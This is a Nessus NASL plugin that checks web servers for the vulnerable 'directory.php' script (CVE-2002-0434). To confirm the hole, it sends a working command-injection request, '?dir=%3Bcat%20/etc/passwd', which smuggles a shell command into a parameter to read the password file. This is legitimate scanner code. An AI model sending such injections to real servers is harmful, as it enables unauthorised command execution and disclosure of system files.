#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#

if(description)
{
 script_id(11017);
 script_bugtraq_id(4278);
 script_cve_id("CVE-2002-0434");
 script_version ("$Revision: 1.17 $");
 name["english"] = "directory.php";
 script_name(english:name["english"]);
 
 desc["english"] = "The 'directory.php' file is installed. 
1. This tool allows anybody to read any directory.
2. It is possible to execute arbitrary code with the rights 
   of the HTTP server.

Solution : remove 'directory.php'.

Risk factor : High";


 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of /directory.php";
  summary["francais"] = "Vérifie la présence de /directory.php";

 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

foreach dir (cgi_dirs())
{
req = http_get(port:port, item:string(dir, "/directory.php?dir=%3Bcat%20/etc/passwd"));
r = http_keepalive_send_recv(port:port, data:req);
if( r == NULL ) exit(0);
if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 {	
 	security_hole(port);
        exit(0);
 }
}
